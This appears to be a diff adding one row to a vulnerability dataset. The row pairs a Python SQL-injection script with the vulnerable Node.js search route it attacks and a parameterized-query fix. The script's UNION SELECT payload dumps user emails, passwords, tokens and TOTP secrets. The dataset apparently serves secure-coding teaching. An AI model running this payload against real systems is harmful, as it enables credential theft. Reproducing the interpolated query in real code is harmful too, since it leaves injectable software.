@@ -1,0 +1,23 @@
+"id","vuln_type","cwe","input","output","fix"
+"pair_002","SQLi - UNION SELECT","CWE-89","import requests
+import urllib.parse
+import json
+
+TARGET = ""http://vulnerable-app:3000""
+
+sqli = ""')) UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive FROM Users--""
+url = f""{TARGET}/rest/products/search?q={urllib.parse.quote(sqli)}""
+
+resp = requests.get(url, timeout=10)
+data = resp.json()
+
+if ""data"" in data and len(data[""data""]) > 0:
+    print(f""[+] Dumped {len(data['data'])} records"")
+    for item in data[""data""][:5]:
+        print(json.dumps(item))
+","app.get('/rest/products/search', async (req, res) => {
+    const q = req.query.q || '';
+    const query = `SELECT * FROM Products WHERE ((name LIKE '%${q}%' OR description LIKE '%${q}%') AND deletedAt IS NULL) ORDER BY name`;
+    const [results] = await sequelize.query(query);
+    res.json({ status: 'success', data: results });
+});","sequelize.query('SELECT * FROM Products WHERE name LIKE :q', { replacements: { q: `%${q}%` } })"
